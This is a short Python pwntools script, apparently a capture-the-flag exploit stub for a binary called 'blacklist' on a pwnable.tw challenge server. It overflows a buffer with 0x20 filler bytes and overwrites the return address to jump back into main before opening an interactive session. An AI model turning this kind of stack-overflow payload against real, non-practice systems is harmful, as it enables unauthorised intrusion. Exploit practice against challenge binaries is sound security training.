#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("blacklist")
#libc = ELF("./libc.so.6")
#ld = ELF("./ld-2.27.so")

local = True 
if local:
    p = process("./blacklist")
    gdb.attach(p,'''b*0x40143B\nc''')
else:
    p = remote('chall.pwnable.tw', 10001)

elf = context.binary = ELF('./blacklist', checksec=False)

path = b'a'*0x20
main = 0x40143d
payload = path + p64(main) + p64(0x40143B)
p.send(payload)
p.interactive()